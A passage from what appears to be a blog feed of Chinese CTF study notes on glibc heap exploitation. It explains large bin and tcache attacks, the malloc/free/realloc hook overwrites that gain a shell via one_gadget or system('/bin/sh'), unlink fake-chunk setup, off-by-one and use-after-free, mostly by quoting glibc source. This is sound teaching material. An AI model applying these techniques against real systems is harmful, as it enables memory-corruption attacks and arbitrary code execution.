(size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">              &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;   <span class="comment">//这个循环会一直运行直到victim大小大于等于fwd</span></span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">              == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;  <span class="comment">//相等则放到后面,无需更改nextsize,每次都是如此，也就是说新来的相同大小的 chunk 永远是放在第二个位置</span></span><br><span class="line">                      <span class="comment">//注意!!展示的代码并没有在这种情况真正将victim加入largebin的代码</span></span><br><span class="line">                      <span class="comment">//事实上这块代码都只是针对nextsize链表操作的</span></span><br><span class="line">                      <span class="comment">//真正对fd,bk操作的代码下方未展示</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;<span class="comment">//若大于</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);  <span class="comment">//检查fwd是否合规</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>largebin attack就是出现在这个提取chunk的过程中</p><h2 id="Large-bin-attack利用条件"><a href="#Large-bin-attack利用条件" class="headerlink" title="Large bin attack利用条件"></a>Large bin attack利用条件</h2><ul><li>可以修改一个large bin chunk的data</li><li><p>从unsorted bin中来的large bin chunk要紧跟在被构造过的chunk的后面</p></li><li><p>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</p></li><li>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</li></ul><h1 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h1><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。任意地址作为chunk操作</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><p>类似 <code>fastbin dup</code>，不过利用的是 <code>tcache_put()</code> 的不严谨,因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。也就是造成一个chunk可以被无数次取出利用</p><h2 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h2><p>通过tcache posioning将tcache链中的某个chunk指向他cacheperthread本身,因为 tcache_perthread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h2><p>与fastbin的house of spirit一个原理,因为没有检查反而更简单,不需要伪造nextsize等</p><h2 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h2><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>利用smallbin中的chunk转移到tcache的漏洞</p><h2 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h2><p>与无tcache相比得先填满tcache</p><h2 id="tcache-check"><a href="#tcache-check" class="headerlink" title="tcache check"></a>tcache check</h2><p>新版本中<code>tcache_entry</code>中增加了一项<code>struct tcache_perthread_struct *key</code>，将<code>chunk</code>放入<code>tcache</code>后，会将<code>key</code>修改为<code>tcache</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    +  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    +  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>在<code>free</code>的时候，如果发现<code>key</code>为<code>tcache</code>就要进行<code>double free</code>的检查，这是因为<code>key</code>位于<code>bk</code>的位置，而<code>tcache</code>也不清除<code>chunk</code>，存在很小的可能碰巧为<code>tcache</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+    <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))</span><br><span class="line">+      &#123;</span><br><span class="line">+       tcache_entry *tmp;</span><br><span class="line">+       LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">+       <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">+            tmp;</span><br><span class="line">+            tmp = tmp-&gt;next)</span><br><span class="line">+         <span class="keyword">if</span> (tmp == e)</span><br><span class="line">+           malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">+       <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a few</span></span><br><span class="line"><span class="comment">+          cycles, but don&#x27;t abort.  */</span></span><br><span class="line">+      &#125;</span><br></pre></td></tr></table></figure><p>因为很少发生，这里的检查也比较彻底，会检查该<code>tc_idx</code>中的每一项是否和当前要释放的堆块相同。这个<code>check</code>可以通过改写<code>key</code>来绕过。</p>]]></content>
    
    
    <summary type="html">bin attack!!</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="堆利用" scheme="https://ixout.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    <category term="fastbin" scheme="https://ixout.github.io/tags/fastbin/"/>
    
  </entry>
  
  <entry>
    <title>堆利用-2</title>
    <link href="https://ixout.github.io/posts/61137/"/>
    <id>https://ixout.github.io/posts/61137/</id>
    <published>2023-03-30T01:12:55.000Z</published>
    <updated>2023-04-05T02:58:37.477Z</updated>
    
    <content type="html"><![CDATA[<h1 id="malloc-hook和free-hook"><a href="#malloc-hook和free-hook" class="headerlink" title="malloc_hook和free_hook"></a>malloc_hook和free_hook</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在调用malloc或者free的时候，如果 <strong>malloc_hook 和free_hook的值存在</strong>，<strong>则会调用malloc_hook或者free_hook指向的地址</strong>，假设在使用one_gadget的时候满足one_gadget的调用条件，当overwrite malloc_hook和free_hook的时候，便可以getshell，执行malloc的时候，其参数是size大小，所以overwrite malloc_hook的时候使用one_gadget的地址可以getshell。执行free的时候，可以将__free_hook的值overwrite为system的地址，通过释放(/bin/sh\x00)的chunk，可以达到system(/bin/sh)来getshell</p><ul><li>malloc_hook位于main_arena下方的位置(绝大多时候是0x10)，可以通过fake chunk来overwrite该值实现getshell</li><li>free_hook 位于libc上_free_hook上，可以通过fake chunk来overwrite该值达到劫持程序流的目的</li></ul><h2 id="malloc-hook利用"><a href="#malloc-hook利用" class="headerlink" title="malloc_hook利用"></a>malloc_hook利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><ul><li>利用思路：在执行malloc时，会检测__malloc_hook的值，如果malloc_hook的值存在，将调用malloc_hook指向的地址call rax，如果我们将该值overite 为one_gadget，当程序执行malloc的时候，便可以getshell</li></ul><h2 id="free-hook利用"><a href="#free-hook利用" class="headerlink" title="free_hook利用"></a>free_hook利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>利用思路：<ul><li>通过改写main_arena中的top_chunk的地址，将top_chunk的值改写到<strong>free_hook上方指定的位置，通过不断向top_chunk申请chunk，最终可以分配到包含</strong>free_hook的区块，从而可以改写__free_hook的值。</li><li>通过改写global_max_fast的值，可以在free_hook的上方找到一个足够大包含free_hook的块，当改写了global_max_fast后，向heap申请的块都将按照fastbin来处理</li><li>通过unsorted bin attack 在free_hook上方<strong>伪造 0x7f大小的chunk</strong>,再通过fastbin attack 来修改free_hoook的值</li></ul></li></ul><h1 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="realloc_hook"></a>realloc_hook</h1><p>realloc_hook与malloc_hook 相似是一个弱类型的指针.在调用realloc()函数是会判断realloc_hook的值是否为空,不为空则执行其执行的代码.这是realloc_hook的一种用法。</p><p>同时，我们也可以用malloc_hook来指向_libc_realloc()函数内部(即强行调用realloc())然后通过realloc_hook来触发one_gadget.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>我们可以将realloc_hook改为onegadget，然后通过这些push和sub操作”微调”rsp寄存器，使其能够满足在调用realloc_hook（也就是onegadget）的时候满足相应的rsp条件。相应的利用方法就是由传统的直接修改malloc_hook变为先修改realloc_hook为onegadget之后，修改malloc_hook到特定的一个push处或sub处，然后调用malloc便相当于执行了满足条件的onegadget。</p>]]></content>
    
    
    <summary type="html">hook</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="堆利用" scheme="https://ixout.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>堆利用-1</title>
    <link href="https://ixout.github.io/posts/61329/"/>
    <id>https://ixout.github.io/posts/61329/</id>
    <published>2023-03-28T08:35:27.000Z</published>
    <updated>2023-04-02T01:47:18.540Z</updated>
    
    <content type="html"><![CDATA[<span class='p blue h4'>四个基础漏洞，其他利用方式大多要用到它们</span><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p><strong>unlink宏</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>对于非largebin来说有两次检查</p><p>可以看到<code>unlink()</code>函数首先检查当前 chunk 的 size 和下一个 chunk 的 prev_size 是否相等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查后一个 chunk 的 bk 和前一个 chunk 的 fd 是否指向当前 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != p || BK-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>本节只是简要的过一遍流程,这部分知识网上很全,学习过程中一定要注意讲解中提到的指针和地址的区别(虽然指针和地址其实是一个东西)</strong></p><p>我们先假设伪造了一个 fake chunk 可以成功利用 unlink。这时我们可以通过溢出的方式将某个 chunk 的 prev_size 改写成这个 chunk 到 fake chunk 的距离，并将 size 的 P 位改成 0，然后对该 chunk 进行<code>free()</code>，就触发了后向合并，此时会对 fake chunk 进行 unlink。</p><p>我们如何利用 unlink 呢？我们伪造的 fake chunk 需要满足<code>FD-&gt;bk == p &amp;&amp; BK-&gt;fd == p</code>，才能让<code>FD-&gt;bk = BK;BK-&gt;fd = FD;</code>。如果我们有一个指向 fake chunk 的指针的地址时好像就有办法了。我们先设指向 fake chunk 的指针为<code>ptr</code>，然后构造一个这样的 fake chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd = &amp;ptr<span class="number">-0x18</span>;</span><br><span class="line">bk = &amp;ptr<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure><p>此时的FD和BK:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD == &amp;ptr<span class="number">-0x18</span>;</span><br><span class="line">BK == &amp;ptr<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure><p>在 unlink 执行检查时，发现满足条件，成功通过检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk == *(&amp;ptr<span class="number">-0x18</span>+<span class="number">0x18</span>) == p;</span><br><span class="line">BK-&gt;fd == *(&amp;ptr<span class="number">-0x10</span>+<span class="number">0x10</span>) == p;</span><br></pre></td></tr></table></figure><p>执行 unlink，最后<code>ptr</code>指向<code>&amp;ptr-0x18</code>处的位置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FD-&gt;bk = BK</span></span><br><span class="line"><span class="comment">// *(&amp;ptr-0x10+0x10) = &amp;ptr-0x10;</span></span><br><span class="line">ptr = &amp;ptr<span class="number">-0x10</span>;</span><br><span class="line"><span class="comment">// BK-&gt;fd = FD</span></span><br><span class="line"><span class="comment">// *(&amp;ptr-0x10+0x10) = &amp;ptr-0x18</span></span><br><span class="line">ptr = &amp;ptr<span class="number">-0x18</span></span><br></pre></td></tr></table></figure><p>从利用原理不难看出,利用的一个前提是我们要能够知道该堆块指针的地址(最好是在bss段)</p><p>自己粗糙地画了一幅图,是全部操作完成后的示意图</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-28_213612.png" alt=""></p><p>可以看到本来指向heap地ptr1指针,指向了自己地址的-0x18处</p><details class="folding-tag" yellow><summary> 关于指针加减法 </summary>              <div class='content'>              <p>其实&amp;ptr1-0x18这类写法是不正确的，这样写真正代表的意思是ptr1的地址加上0x18*sizeof(&amp;ptr1所指向的类型)</p><p>一定要这样写的话应该是(long long)&amp;ptr1-0x18</p>              </div>            </details><h1 id="off—by—one"><a href="#off—by—one" class="headerlink" title="off—by—one"></a>off—by—one</h1><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>其又分为两种</p><ol><li><strong>off-by-one</strong></li><li><strong>off-by-null</strong></li></ol><p>其中第一类包含第二类</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>这三篇我觉得很不错</p><h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p><a href="https://blog.csdn.net/qq_41202237/article/details/108116618">好好说话之off-by-one_hollk的博客-CSDN博客</a></p><h3 id="2018强网杯gambox"><a href="#2018强网杯gambox" class="headerlink" title="2018强网杯gambox"></a>2018强网杯gambox</h3><p><a href="https://www.freebuf.com/news/168064.html">CTF经验 | Off-By-One相关知识点浅析 - FreeBuf网络安全行业门户</a></p><h3 id="V-amp-N2020招新赛simpleheap"><a href="#V-amp-N2020招新赛simpleheap" class="headerlink" title="V&amp;N2020招新赛simpleheap"></a>V&amp;N2020招新赛simpleheap</h3><p><a href="https://zhuanlan.zhihu.com/p/371413926">快速入门堆溢出技巧(OFF BY ONE) - 知乎 (zhihu.com)</a></p><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>uaf 漏洞产生的主要原因是释放了一个堆块后，并没有将该指针置为 NULL，这样导致该指针处于悬空的状态，同样被释放的内存如果被恶意构造数据，就有可能会被利用。</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p><p>在 ptmalloc 中，获取 chunk 块大小的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Get size, ignoring use bits */</span><br><span class="line">#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="line"></span><br><span class="line">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="line">#define chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></pre></td></tr></table></figure><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p><p>在 ptmalloc 中，<strong>获取下一 chunk 块</strong>地址的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Ptr to next physical malloc_chunk. */</span><br><span class="line">#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></pre></td></tr></table></figure><p>即使用<strong>当前块指针加上当前块大小。</strong></p><p>在 ptmalloc 中，<strong>获取前一个 chunk</strong> 信息的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="line"></span><br><span class="line">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></pre></td></tr></table></figure><p>即通过 <strong>malloc_chunk-&gt;prev_size 获取前一块大小</strong>，然后使用本 chunk 地址减去所得大小。</p><p>在 ptmalloc，<strong>判断当前 chunk 是否是 use</strong> 状态的操作如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define inuse(p)</span><br><span class="line">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>即<strong>查看下一 chunk 的 prev_inuse 域</strong>，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p><p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。。</p>]]></content>
    
    
    <summary type="html">unlink、off-by-one、UAF、Chunk Extend and Overlapping</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="堆利用" scheme="https://ixout.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题记录-2</title>
    <link href="https://ixout.github.io/posts/14188/"/>
    <id>https://ixout.github.io/posts/14188/</id>
    <published>2023-03-27T06:12:13.000Z</published>
    <updated>2023-03-30T00:36:49.851Z</updated>
    
